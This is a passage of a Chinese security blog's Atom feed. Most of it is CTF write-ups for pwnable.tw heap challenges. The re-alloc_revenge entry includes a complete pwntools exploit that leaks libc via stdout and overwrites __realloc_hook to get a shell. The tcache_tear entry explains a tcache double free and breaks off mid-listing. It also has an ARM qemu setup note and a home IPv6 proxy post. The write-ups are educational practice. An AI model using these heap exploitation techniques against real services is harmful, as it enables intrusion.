href="https://stackoverflow.com/questions/53268118/whats-the-difference-between-mov-movz-movn-and-movk-in-armv8-assembly">aarch64 movk movn movz</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;环境配置&quot;&gt;&lt;a href=&quot;#环境配置&quot; class=&quot;headerlink&quot; title=&quot;环境配置&quot;&gt;&lt;/a&gt;环境配置&lt;/h2&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; sudo apt install qemu-user gdb-multiarch&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;安装完成后就可以运行平台上的静态链接文件了，会自动调用qemu执行。&lt;/p&gt;
&lt;h3 id=&quot;动态链接程序&quot;&gt;&lt;a href=&quot;#动态链接程序&quot; class=&quot;headerlink&quot; title=&quot;动态链接程序&quot;&gt;&lt;/a&gt;动态链接程序&lt;/h3&gt;&lt;p&gt;对于动态链接的程序，还需要安装跨平台的lib。&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; apt-cache search &lt;span class=&quot;string&quot;&gt;&amp;quot;libc&amp;quot;&lt;/span&gt; | grep arm&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;安装类似libc6-ARCH-cross。&lt;/p&gt;
&lt;p&gt;动态链接库被安装在类似&lt;code&gt;/usr/arm-linux-gnueabihf/&lt;/code&gt;的路径。qemu不知道动态链接的位置，它预期在类似&lt;code&gt;/etc/qemu-binfmt/arm&lt;/code&gt;的路径，所以可以设置软链接来避免用&lt;code&gt;-L&lt;/code&gt;来指定链接库位置。&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; sudo mkdir /etc/qemu-binfmt&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; sudo ln -s /usr/arm-linux-gnueabihf /etc/qemu-binfmt/arm&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; sudo ln -s /usr/aarch64-linux-gnu/ /etc/qemu-binfmt/aarch64 &lt;span class=&quot;comment&quot;&gt;# 对于aarch64&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://hhdx.xyz/tags/CTF/"/>
    
    <category term="ARM" scheme="http://hhdx.xyz/tags/ARM/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.tw re-alloc_revenge</title>
    <link href="http://hhdx.xyz/2020/09/07/pwnable-tw-re-alloc-revenge/"/>
    <id>http://hhdx.xyz/2020/09/07/pwnable-tw-re-alloc-revenge/</id>
    <published>2020-09-07T06:48:20.000Z</published>
    <updated>2020-10-24T13:21:30.860Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>防护比<a href="https://hhdx.xyz/2020/08/07/pwnable-tw-re-alloc/">re-alloc</a>多了FULL RELRO和PIE。其他没有改变。</p><h2 id="总体思路"><a href="#总体思路" class="headerlink" title="总体思路"></a>总体思路</h2><p>程序没有show函数，所以通过修改stdout的方式泄露libc。</p><p>将一个chunk同时释放到tcache和unsorted bin，partial overwrite fd部分，指向stdout，需要爆破4bit。取得stdout后修改进行泄露。</p><p>最后修改<code>__realloc_hook</code>为one_gadget得到shell。</p><p>主要难点在布局构造。</p><a id="more"></a><h2 id="partial-overwrite指向stdout"><a href="#partial-overwrite指向stdout" class="headerlink" title="partial overwrite指向stdout"></a>partial overwrite指向stdout</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将chunk(0x70)分割成0x20和0x50的两块，造成overlap</span></span><br><span class="line"><span class="comment"># 便于后续修改chunk(0x50)的size</span></span><br><span class="line">allocate(<span class="number">0</span>, <span class="number">0x68</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0x18</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># double free chunk(0x50)</span></span><br><span class="line">allocate(<span class="number">0</span>, <span class="number">0x48</span>, <span class="string">&quot;B&quot;</span>)</span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0x48</span>, <span class="string">&quot;B&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改chunk(0x50)的size</span></span><br><span class="line">allocate(<span class="number">0</span>, <span class="number">0x48</span>, <span class="string">&quot;C&quot;</span>)</span><br><span class="line">allocate(<span class="number">1</span>, <span class="number">0x68</span>, <span class="string">b&quot;C&quot;</span>*<span class="number">0x18</span>+p64(<span class="number">0x451</span>))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># bypass prev_inuse(nextchunk) check in free function</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">    allocate(<span class="number">1</span>, <span class="number">0x58</span>, <span class="string">&quot;D&quot;</span>)</span><br><span class="line">    realloc(<span class="number">1</span>, <span class="number">0x78</span>, <span class="string">&quot;D&quot;</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># free to unsorted bin</span></span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment"># partial overwrite to stdout</span></span><br><span class="line">realloc(<span class="number">0</span>, <span class="number">0x38</span>, <span class="string">b&quot;\x60\xa7&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><p>本地写exploit的时候，可以在process中指定参数<code>aslr=False</code>，禁用随机化，避免爆破，便于调试。</p><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p><a href="https://github.com/clxsh/ctf_wps/blob/master/pwnable.tw/Re-alloc_revenge/exp.py">exp</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">localfile = <span class="string">&quot;./re-alloc_revenge&quot;</span></span><br><span class="line">locallibc = <span class="string">&quot;./libc.so.6&quot;</span></span><br><span class="line">pf      = <span class="keyword">lambda</span> name,num           :log.info(name + <span class="string">&quot;: 0x%x&quot;</span> % num)</span><br><span class="line">g       = <span class="keyword">lambda</span> x                  :next(libc.search(asm(x)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allocate</span>(<span class="params">idx, size, data</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size:&quot;</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Data:&quot;</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">realloc</span>(<span class="params">idx, size, data</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size:&quot;</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    <span class="keyword">if</span> size != <span class="number">0</span>:</span><br><span class="line">        io.recvuntil(<span class="string">&quot;Data:&quot;</span>)</span><br><span class="line">        io.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    one_gadget = <span class="number">0x106ef8</span></span><br><span class="line"></span><br><span class="line">    allocate(<span class="number">0</span>, <span class="number">0x48</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    allocate(<span class="number">0</span>, <span class="number">0x68</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">    realloc(<span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    realloc(<span class="number">0</span>, <span class="number">0x18</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    allocate(<span class="number">0</span>, <span class="number">0x48</span>, <span class="string">&quot;B&quot;</span>)</span><br><span class="line">    realloc(<span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    realloc(<span class="number">0</span>, <span class="number">0x48</span>, <span class="string">&quot;B&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    allocate(<span class="number">0</span>, <span class="number">0x48</span>, <span class="string">&quot;C&quot;</span>)</span><br><span class="line">    allocate(<span class="number">1</span>, <span class="number">0x68</span>, <span class="string">b&quot;C&quot;</span>*<span class="number">0x18</span>+p64(<span class="number">0x451</span>))</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">        allocate(<span class="number">1</span>, <span class="number">0x58</span>, <span class="string">&quot;D&quot;</span>)</span><br><span class="line">        realloc(<span class="number">1</span>, <span class="number">0x78</span>, <span class="string">&quot;D&quot;</span>)</span><br><span class="line">        free(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 0x60 count++</span></span><br><span class="line">    allocate(<span class="number">1</span>, <span class="number">0x58</span>, <span class="string">&quot;A&quot;</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    realloc(<span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    realloc(<span class="number">0</span>, <span class="number">0x38</span>, <span class="string">b&quot;\x60\xa7&quot;</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(io, &quot;&quot;&quot;b menu</span></span><br><span class="line">    <span class="comment"># b read_input</span></span><br><span class="line">    <span class="comment"># &quot;&quot;&quot;)</span></span><br><span class="line">    allocate(<span class="number">1</span>, <span class="number">0x48</span>, <span class="string">&quot;E&quot;</span>)</span><br><span class="line">    realloc(<span class="number">1</span>, <span class="number">0x18</span>, <span class="string">&quot;E&quot;</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    realloc(<span class="number">0</span>, <span class="number">0x18</span>, <span class="string">&quot;E&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># gdb.attach(io, &quot;b menu&quot;)</span></span><br><span class="line"></span><br><span class="line">    allocate(<span class="number">0</span>, <span class="number">0x48</span>, p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+<span class="string">b&quot;leak:&quot;</span>.rjust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(io.recvuntil(<span class="string">&quot;leak:&quot;</span>, timeout=<span class="number">1</span>)) == <span class="number">0</span>:</span><br><span class="line">        log.debug(<span class="string">&quot;failed&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    libc_base = u64(io.recv(<span class="number">8</span>)) - <span class="number">0x1E5700</span></span><br><span class="line">    pf(<span class="string">&quot;libc_base&quot;</span>, libc_base)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># gdb.attach(io, &quot;b menu&quot;)</span></span><br><span class="line"></span><br><span class="line">    allocate(<span class="number">1</span>, <span class="number">0x78</span>, <span class="string">&quot;F&quot;</span>)</span><br><span class="line">    realloc(<span class="number">1</span>, <span class="number">0</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    realloc(<span class="number">1</span>, <span class="number">0x18</span>, <span class="string">&quot;F&quot;</span>*<span class="number">0x10</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(io, &quot;b menu&quot;)</span></span><br><span class="line">    allocate(<span class="number">1</span>, <span class="number">0x78</span>, <span class="string">b&quot;F&quot;</span>*<span class="number">0x18</span>+p64(<span class="number">0x61</span>)+p64(libc_base+libc.sym[<span class="string">&quot;__realloc_hook&quot;</span>]))</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    allocate(<span class="number">1</span>, <span class="number">0x58</span>, <span class="string">&quot;G&quot;</span>)</span><br><span class="line">    realloc(<span class="number">1</span>, <span class="number">0x28</span>, <span class="string">&quot;G&quot;</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># gdb.attach(io, &quot;b realloc&quot;)</span></span><br><span class="line">    <span class="comment"># allocate(1, 0x58, p64(libc_base+libc.sym[&quot;malloc&quot;])+p64(libc_base+one_gadget))</span></span><br><span class="line">    allocate(<span class="number">1</span>, <span class="number">0x58</span>, p64(libc_base+one_gadget))</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size:&quot;</span>)</span><br><span class="line">    io.sendline(str(<span class="number">0x58</span>))</span><br><span class="line">    </span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line">elf = ELF(localfile)</span><br><span class="line">libc = ELF(locallibc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"><span class="comment"># if True:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        print(<span class="string">&quot;----------------------------------------------------------&quot;</span>)</span><br><span class="line">        argc = len(sys.argv)</span><br><span class="line">        <span class="keyword">if</span> argc == <span class="number">1</span>:</span><br><span class="line">            <span class="comment"># io = process(localfile, aslr=False)</span></span><br><span class="line">            io = process(localfile)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> argc == <span class="number">2</span>:</span><br><span class="line">                host, port = sys.argv[<span class="number">1</span>].split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">            <span class="keyword">elif</span> argc == <span class="number">3</span>:</span><br><span class="line">                host = sys.argv[<span class="number">1</span>]</span><br><span class="line">                port = sys.argv[<span class="number">2</span>]</span><br><span class="line">            io = remote(host, port)</span><br><span class="line"></span><br><span class="line">        exp()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        io.close()</span><br></pre></td></tr></table></figure><h2 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h2><ol><li><p><a href="https://n0nop.com/2020/03/18/pwn-heap-re-alloc-revenge/#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0">https://n0nop.com/2020/03/18/pwn-heap-re-alloc-revenge/#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0</a></p></li><li><p><a href="http://blog.eonew.cn/archives/1190">http://blog.eonew.cn/archives/1190</a></p></li></ol>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;题目分析&quot;&gt;&lt;a href=&quot;#题目分析&quot; class=&quot;headerlink&quot; title=&quot;题目分析&quot;&gt;&lt;/a&gt;题目分析&lt;/h2&gt;&lt;p&gt;防护比&lt;a href=&quot;https://hhdx.xyz/2020/08/07/pwnable-tw-re-alloc/&quot;&gt;re-alloc&lt;/a&gt;多了FULL RELRO和PIE。其他没有改变。&lt;/p&gt;
&lt;h2 id=&quot;总体思路&quot;&gt;&lt;a href=&quot;#总体思路&quot; class=&quot;headerlink&quot; title=&quot;总体思路&quot;&gt;&lt;/a&gt;总体思路&lt;/h2&gt;&lt;p&gt;程序没有show函数，所以通过修改stdout的方式泄露libc。&lt;/p&gt;
&lt;p&gt;将一个chunk同时释放到tcache和unsorted bin，partial overwrite fd部分，指向stdout，需要爆破4bit。取得stdout后修改进行泄露。&lt;/p&gt;
&lt;p&gt;最后修改&lt;code&gt;__realloc_hook&lt;/code&gt;为one_gadget得到shell。&lt;/p&gt;
&lt;p&gt;主要难点在布局构造。&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://hhdx.xyz/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>R7000梅林搭建ipv6代理</title>
    <link href="http://hhdx.xyz/2020/09/01/R7000%E6%A2%85%E6%9E%97%E6%90%AD%E5%BB%BAipv6%E4%BB%A3%E7%90%86/"/>
    <id>http://hhdx.xyz/2020/09/01/R7000%E6%A2%85%E6%9E%97%E6%90%AD%E5%BB%BAipv6%E4%BB%A3%E7%90%86/</id>
    <published>2020-09-01T00:55:50.000Z</published>
    <updated>2020-10-24T13:21:30.860Z</updated>
    
    <content type="html"><![CDATA[<p>目前宽带基本都支持了ipv6(可能需要自己在光猫开启)，为了在学校省流量，利用家庭宽带的ipv6环境搭一个代理。</p><p>R7000固件版本是koolshare X7.9.1，使用软件中心ss server 3.1。默认情况下，该插件不支持ipv6代理。通过查看该<a href="https://github.com/koolshare/merlin-ssserver">插件的代码</a>，发现了可以修改启动脚本使其支持ipv6。</p><p>需要开启固件的telnet或者ssh。</p><p>/koolshare/ssserver/目录下存放的其启动脚本ssserver.sh。</p><p>修改服务器地址为<code>::</code>，并添加允许外部访问的两条规则。重新启动插件就可以了。</p><p><img src="https://raw.githubusercontent.com/clxsh/pics/master/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202020-09-01%20091624.jpg"></p><p>客户端windows可以使用<a href="https://github.com/shadowsocks/shadowsocks-windows">shadowsocks-windows</a>，mac可以用<a href="https://github.com/shadowsocks/ShadowsocksX-NG">ShadowsocksX-NG</a></p><p>实测延迟183，受限于家庭宽带上传，30Mbps下载，5Mbps上传…..</p><h2 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h2><ol><li><a href="https://www.polarxiong.com/archives/%E6%90%AD%E5%BB%BAipv6-VPN-%E8%AE%A9ipv4%E4%B8%8Aipv6-%E4%B8%8B%E8%BD%BD%E9%80%9F%E5%BA%A6%E6%8F%90%E5%8D%87%E5%88%B0100M.html">https://www.polarxiong.com/archives/%E6%90%AD%E5%BB%BAipv6-VPN-%E8%AE%A9ipv4%E4%B8%8Aipv6-%E4%B8%8B%E8%BD%BD%E9%80%9F%E5%BA%A6%E6%8F%90%E5%8D%87%E5%88%B0100M.html</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;目前宽带基本都支持了ipv6(可能需要自己在光猫开启)，为了在学校省流量，利用家庭宽带的ipv6环境搭一个代理。&lt;/p&gt;
&lt;p&gt;R7000固件版本是koolshare X7.9.1，使用软件中心ss server 3.1。默认情况下，该插件不支持ipv6代理。通过查看该&lt;a</summary>
      
    
    
    
    
    <category term="misc" scheme="http://hhdx.xyz/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>pwnable.tw tcache_tear seethefile</title>
    <link href="http://hhdx.xyz/2020/08/19/pwnable-tw-tcache-tear-seethefile/"/>
    <id>http://hhdx.xyz/2020/08/19/pwnable-tw-tcache-tear-seethefile/</id>
    <published>2020-08-19T09:26:17.000Z</published>
    <updated>2020-10-24T13:21:30.870Z</updated>
    
    <content type="html"><![CDATA[<h1 id="tcache-tear"><a href="#tcache-tear" class="headerlink" title="tcache_tear"></a>tcache_tear</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">FORTIFY:  Enabled</span><br><span class="line"></span><br><span class="line">libc_version: Ubuntu GLIBC 2.27-3ubuntu1</span><br></pre></td></tr></table></figure><p>程序开始在bss段上读入了一个0x20的名字</p><p>malloc: 输入指定size，分配，指针ptr同样存储在bss，读入size-16的字符，这里字符个数可以溢出</p><p>free: 释放ptr空间，指针悬空，可以double free，程序使用了tcache，且在这个版本释放没有任何的检查</p><p>info: 打印姓名</p><h2 id="总体思路"><a href="#总体思路" class="headerlink" title="总体思路"></a>总体思路</h2><p>利用tcache double free，可以对任意地址进行改写。在name处伪造一个chunk释放到unsorted bin，进行libc base的泄露。将<code>__free_hook</code>改写为system地址。</p><p>伪造chunk注意绕过free的所有检查。伪造完成的结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">+----------+</span><br><span class="line">|          |</span><br><span class="line">|          |</span><br><span class="line">|  0x421   |</span><br><span class="line">|          |</span><br><span class="line">+----------+</span><br><span class="line">|  0x21    |</span><br><span class="line">+----------+</span><br><span class="line">|  0x21    |</span><br><span class="line">+----------+</span><br></pre></td></tr></table></figure><p>tcache默认最多有64个，第1个是0x20大小，递推第64个也就是0x410。所以将name处伪造为0x420大小。第一个chunk的<code>chunk-&gt;size=0x420|pre_in_use</code>，避免backward consolidate，第三个chunk的<code>chunk-&gt;size=0x20|pre_in_use</code>，避免forward consolidate。</p><a id="more"></a><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p><a href="https://github.com/clxsh/ctf_wps/blob/master/pwnable.tw/tcache_tear/exp.py">exp</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 